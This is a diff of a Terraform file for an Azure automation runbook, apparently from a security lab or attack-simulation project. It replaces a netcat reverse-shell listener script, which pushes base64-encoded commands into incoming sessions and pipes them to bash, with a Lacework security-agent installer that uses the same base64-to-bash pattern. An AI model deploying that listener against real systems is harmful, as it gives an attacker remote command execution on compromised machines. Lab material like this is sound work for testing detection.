@@ -1,33 +1,23 @@
-
 locals {
-    listen_port = var.listen_port
-    listen_ip = var.listen_ip
-    base64_command_payload = base64encode(var.payload)
+    setup_lacework_agent = templatefile("${path.module}/resources/setup_lacework_agent.sh", {
+        LaceworkInstallPath="/var/lib/lacework"
+        LaceworkTempPath=var.lacework_agent_temp_path
+        Tags=jsonencode(var.lacework_agent_tags)
+        Hash=""
+        Serverurl=var.lacework_server_url
+        Token=can(length(var.lacework_agent_access_token)) ? var.lacework_agent_access_token : lacework_agent_access_token.agent[0].token
+    })
+
     payload = <<-EOT
-    LOGFILE=/tmp/ssm_attacker_exec_reverseshell_listener.log
+    LOGFILE=/tmp/runbook_deploy_lacework_agent.log
     function log {
         echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
         echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
     }
     truncate -s 0 $LOGFILE
-    log "listener: ${local.listen_ip}:${local.listen_port}"
-    while true; do
-        screen -ls | grep netcat | cut -d. -f1 | awk '{print $1}' | xargs kill
-        truncate -s 0 /tmp/netcat.log
-        screen -d -L -Logfile /tmp/netcat.log -S netcat -m nc -vv -nl ${local.listen_ip} ${local.listen_port}
-        screen -S netcat -X colon "logfile flush 0^M"
-        log "listener started.."
-        until tail /tmp/netcat.log | grep -m 1 "Connection received"; do
-            log "waiting for connection...";
-            sleep 10;
-        done
-        sleep 30
-        log 'sending screen command: ${var.payload}';
-        screen -S netcat -p 0 -X stuff "echo '${local.base64_command_payload}' | base64 -d | /bin/bash -^M"
-        sleep 300
-        log "restarting attacker session..."
-    done
-    log "done"
+    log "starting..."
+    echo '${base64encode(local.setup_lacework_agent)}' | base64 -d | /bin/bash -
+    log "done."
     EOT
     base64_payload = base64encode(local.payload)
 }
@@ -43,6 +33,15 @@ locals {
 
 
 data "azurerm_subscription" "current" {
+}
+
+#####################################################
+# LACEWORK AGENT
+#####################################################
+
+resource "lacework_agent_access_token" "agent" {
+    count = can(length(var.lacework_agent_access_token)) ? 0 : 1
+    name = "endpoint-aws-agent-access-token-${var.environment}-${var.deployment}"
 }
 
 #####################################################
@@ -128,3 +127,6 @@ resource "azurerm_automation_job_schedule" "demo_sched_private" {
     runbook_name            = azurerm_automation_runbook.demo_rb_private.name
     depends_on              = [azurerm_automation_schedule.hourly_private]
 }
+
+
+
